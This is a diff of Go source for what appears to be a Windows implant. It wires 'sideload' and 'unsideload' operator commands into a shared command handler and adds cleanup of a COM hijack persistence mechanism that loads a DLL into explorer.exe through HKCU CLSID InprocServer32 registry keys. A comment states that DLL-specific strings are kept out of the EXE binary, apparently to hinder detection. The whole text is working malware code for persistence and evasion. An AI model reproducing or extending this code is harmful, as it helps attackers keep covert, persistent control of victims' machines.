@@ -303,15 +303,32 @@ func removeSideload() string {
 }
 
 // ================================================================
-// SIDELOAD COMMAND INTERFACE (called from handleCommand in main.go)
+// HOOKS — wire DLL-specific commands/cleanup into shared main.go
 // ================================================================
 
-func installSideload() string {
-	return performSideload()
+func dllCommandHandler(cmd string) (string, bool) {
+	switch strings.ToLower(strings.TrimSpace(cmd)) {
+	case "sideload":
+		return performSideload(), true
+	case "unsideload":
+		return removeSideload(), true
+	}
+	return "", false
 }
 
-func uninstallSideload() string {
-	return removeSideload()
+func dllPersistCleanup() {
+	regDelete(HKCU, comRegPath, "")
+	regDelete(HKCU, comRegPath, "ThreadingModel")
+	parentKey := `Software\Classes\CLSID\` + comHijackCLSID
+	regDelete(HKCU, parentKey+`\InprocServer32`, "")
+	os.Remove(sideloadFullPath())
+}
+
+func dllOptionsText() string {
+	return `
+DLL SIDELOAD
+  sideload       - Install COM hijack persistence (explorer.exe)
+  unsideload     - Remove COM hijack + sideloaded DLL`
 }
 
 // ================================================================
@@ -332,6 +349,12 @@ func EntryPoint() {
 }
 
 func init() {
+	// Register hooks into shared main.go — all DLL-specific strings
+	// stay in this file and never appear in the EXE binary.
+	extraPersistCleanup = dllPersistCleanup
+	extraOptionsText = dllOptionsText
+	extraCommandHandler = dllCommandHandler
+
 	// Set up COM proxy so audio works when loaded by explorer.exe
 	initCOMProxy()
 
